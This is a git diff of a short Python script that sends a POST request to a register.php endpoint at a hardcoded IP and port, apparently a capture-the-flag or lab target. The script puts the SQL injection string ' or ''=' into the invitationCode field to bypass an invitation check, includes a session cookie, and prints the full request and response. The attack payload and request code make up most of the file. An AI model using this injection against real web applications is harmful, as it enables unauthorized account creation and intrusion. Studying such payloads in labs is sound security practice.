@@ -1,18 +1,23 @@
 import requests
+from urllib.parse import urlparse
 
 # Inputs:
-url = 'https://<ip>'
-cookie = {'PHPSESSID': '<cookie>'}
+url = 'https://83.136.253.5:46642/api/register.php'
+usr = 'unamex'
+passwd = 'Passwd#12'
+inj = "' or ''='"
+cookie = {'PHPSESSID': 'g8am22ifc0urtskcui3nr662uo'}
 
-# URL encoded payloads
+# Request body
 data = (
-	"usernameInput=uname"
-	"&passwordInput=Passwd%2333"
-	"&repeatPasswordInput=Passwd%2333"
-	"&invitationCodeInput=%20or%20''%3d" 
+	f'username={usr}&'
+	f'password={passwd}&'
+	f'repeatPassword={passwd}&'
+	f'invitationCode={inj}'
 )
 
 # POST request
+print(f'Sending POST request to: {url}')
 r = requests.post(
 	url=url,
 	headers={"Content-Type": "application/x-www-form-urlencoded"},
@@ -21,10 +26,18 @@ r = requests.post(
 	verify=False, # Ignore SSL Cert
 	allow_redirects=False
 )
+# Request
+print('\n***** Request *****')
+print(f'{r.request.method} {urlparse(r.request.url).path} HTTP/1.1')
+print(f'Host: {urlparse(r.request.url).netloc}')
+for k, v in r.request.headers.items():
+	print(f'{k}: {v}')
+print(f'\n{r.request.body}')
 
 # Responce
 print('\n***** Response *****')
 print(f'Status Code: {r.status_code} {r.reason}')
 for k, v in r.headers.items():
 	print(f'{k}: {v}')
-print(f'Response-Length: {len(r.content):,}\n') 
+print(f'Response-Length: {len(r.content):,}')
+
